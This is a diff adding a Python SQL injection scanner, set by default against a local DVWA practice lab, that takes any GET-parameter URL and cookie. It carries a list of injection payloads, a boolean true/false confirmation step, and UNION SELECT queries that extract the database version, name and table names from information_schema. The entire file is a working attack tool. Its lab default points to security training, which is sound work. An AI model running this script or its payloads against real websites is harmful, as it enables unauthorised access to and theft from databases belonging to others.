@@ -1,0 +1,270 @@
+import argparse
+import html
+import re
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
+
+import requests
+
+
+DEFAULT_COOKIE = "PHPSESSID=6aec3jv6oc4stp9jjh85ah4tg5; security=low"
+DEFAULT_TARGET = "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=%E6%8F%90%E4%BA%A4#"
+
+SQL_ERRORS = [
+    "sql syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "syntax error",
+    "sql error",
+    "warning: mysql",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "unterminated string literal",
+    "odbc sql server driver",
+    "illegal mix of collations",
+]
+
+PAYLOADS = [
+    "' OR '1'='1",
+    '" OR "1"="1',
+    "' OR 1=1 -- ",
+    '" OR 1=1 -- ',
+    "' OR '1'='1' -- ",
+    "') OR ('1'='1",
+    "') OR ('1'='1' -- ",
+    "' OR '1'='1' #",
+]
+
+CONFIRM_TRUE = "' AND 1=1 -- "
+CONFIRM_FALSE = "' AND 1=2 -- "
+
+
+def parse_cookie_header(cookie_header: str) -> dict:
+    cookies = {}
+    for pair in cookie_header.split(";"):
+        if "=" in pair:
+            name, value = pair.strip().split("=", 1)
+            cookies[name] = value
+    return cookies
+
+
+def normalize_url(url: str):
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    return parsed, qs
+
+
+def build_url(parsed, params):
+    query = urlencode(params, doseq=True)
+    return urlunparse(parsed._replace(query=query))
+
+
+def send_request(url: str, cookies: dict):
+    try:
+        return requests.get(url, cookies=cookies, timeout=15)
+    except requests.RequestException as exc:
+        print(f"[!] Request failed: {exc}")
+        return None
+
+
+def response_indicates_sql_error(text: str) -> bool:
+    lower_text = text.lower()
+    return any(err in lower_text for err in SQL_ERRORS)
+
+
+def compare_response(baseline, test, min_length_diff=50, ratio=0.05):
+    if not baseline or not test:
+        return False
+    if baseline.status_code != test.status_code:
+        return True
+    length_diff = abs(len(baseline.text) - len(test.text))
+    if length_diff > max(min_length_diff, len(baseline.text) * ratio):
+        return True
+    if response_indicates_sql_error(test.text):
+        return True
+    return False
+
+
+def inject_value(original_value: str, payload: str) -> str:
+    return original_value + payload
+
+
+def test_param_for_sqli(parsed, base_params, param_name, original_value, cookies, baseline):
+    print(f"[*] Testing parameter: {param_name}")
+
+    for payload in PAYLOADS:
+        injected = inject_value(original_value, payload)
+        params = {**base_params, param_name: injected}
+        response = send_request(build_url(parsed, params), cookies)
+
+        if not response:
+            continue
+
+        if compare_response(baseline, response):
+            if response_indicates_sql_error(response.text):
+                reason = "SQL error message detected"
+            else:
+                reason = "response changed significantly"
+            print(f"[!] Possible SQL injection: {param_name} -> {injected} ({reason})")
+            return True
+
+    return False
+
+
+def confirm_boolean_injection(parsed, base_params, param_name, original_value, cookies):
+    true_val = inject_value(original_value, CONFIRM_TRUE)
+    false_val = inject_value(original_value, CONFIRM_FALSE)
+
+    print(f"[*] Confirming parameter with boolean test: {param_name}")
+    true_resp = send_request(build_url(parsed, {**base_params, param_name: true_val}), cookies)
+    false_resp = send_request(build_url(parsed, {**base_params, param_name: false_val}), cookies)
+
+    if not true_resp or not false_resp:
+        return False
+
+    if compare_response(true_resp, false_resp, min_length_diff=20, ratio=0.01):
+        print("[+] Boolean SQL injection confirmed: true/false responses differ")
+        return True
+    return False
+
+
+def strip_tags(value: str) -> str:
+    value = re.sub(r"<[^>]+>", "", value)
+    return html.unescape(value).strip()
+
+
+def parse_dvwa_result_pairs(text: str):
+    pairs = []
+    for block in re.findall(r"<pre>(.*?)</pre>", text, flags=re.IGNORECASE | re.DOTALL):
+        lines = [strip_tags(line) for line in re.split(r"<br\s*/?>", block, flags=re.IGNORECASE)]
+        data_lines = [line for line in lines if ":" in line]
+        if len(data_lines) < 3:
+            continue
+        first_value = data_lines[1].split(":", 1)[1].strip()
+        second_value = data_lines[2].split(":", 1)[1].strip()
+        pairs.append((first_value, second_value))
+    return pairs
+
+
+def run_union_query(parsed, base_params, param_name, original_value, cookies, select_sql):
+    payload = f"' UNION SELECT {select_sql} -- "
+    injected = inject_value(original_value, payload)
+    response = send_request(build_url(parsed, {**base_params, param_name: injected}), cookies)
+
+    if not response:
+        return []
+    if response_indicates_sql_error(response.text):
+        print("[!] UNION query returned a SQL error")
+        return []
+
+    return parse_dvwa_result_pairs(response.text)
+
+
+def enumerate_database_info(parsed, base_params, param_name, original_value, cookies):
+    print(f"[*] Enumerating database info through parameter: {param_name}")
+
+    info_pairs = run_union_query(
+        parsed,
+        base_params,
+        param_name,
+        original_value,
+        cookies,
+        "@@version,database()",
+    )
+    table_pairs = run_union_query(
+        parsed,
+        base_params,
+        param_name,
+        original_value,
+        cookies,
+        "CAST(table_name AS CHAR),CAST(table_schema AS CHAR) "
+        "FROM information_schema.tables WHERE table_schema=database()",
+    )
+
+    version = None
+    database_name = None
+    for left, right in info_pairs:
+        if left and right and left != "admin":
+            version = left
+            database_name = right
+            break
+
+    tables = []
+    for table_name, schema_name in table_pairs:
+        if table_name and schema_name == database_name and table_name not in tables:
+            tables.append(table_name)
+
+    print("[+] Enumeration result:")
+    print(f"    DB version: {version or 'not found'}")
+    print(f"    DB name: {database_name or 'not found'}")
+    if tables:
+        print("    Tables:")
+        for table in tables:
+            print(f"      - {table}")
+    else:
+        print("    Tables: not found")
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Simple SQL injection checker for authorized GET-parameter testing"
+    )
+    parser.add_argument("--url", default=DEFAULT_TARGET, help="Target URL with GET parameters")
+    parser.add_argument("--cookie", default=DEFAULT_COOKIE, help="Cookie header for the target")
+    parser.add_argument(
+        "--no-enum",
+        action="store_true",
+        help="Only detect SQL injection; do not enumerate database metadata",
+    )
+    return parser.parse_args()
+
+
+def main():
+    args = parse_args()
+    cookies = parse_cookie_header(args.cookie)
+
+    parsed, query_params = normalize_url(args.url)
+    if not query_params:
+        print("[!] Target URL has no GET parameters; nothing to test.")
+        return
+
+    print(f"[*] Cookie: {args.cookie}")
+    print(f"[*] Target: {args.url}")
+
+    baseline_responses = {}
+    for name, values in query_params.items():
+        baseline_url = build_url(parsed, {**query_params, name: values})
+        baseline_responses[name] = send_request(baseline_url, cookies)
+
+    if any(response is None for response in baseline_responses.values()):
+        print("[!] Baseline request failed. Check target, network, or cookie.")
+        return
+
+    found_any = False
+    for name, values in query_params.items():
+        original_value = values[0] if values else ""
+        vulnerable = test_param_for_sqli(
+            parsed,
+            query_params,
+            name,
+            original_value,
+            cookies,
+            baseline_responses[name],
+        )
+        if not vulnerable:
+            continue
+
+        found_any = True
+        confirmed = confirm_boolean_injection(parsed, query_params, name, original_value, cookies)
+        if confirmed:
+            print(f"[+] Parameter {name} is confirmed vulnerable to SQL injection.")
+            if not args.no_enum:
+                enumerate_database_info(parsed, query_params, name, original_value, cookies)
+        else:
+            print(f"[!] Parameter {name} may be injectable, but boolean confirmation failed.")
+
+    if not found_any:
+        print("[-] No obvious SQL injection was detected. Check the target or cookie.")
+
+
+if __name__ == "__main__":
+    main()
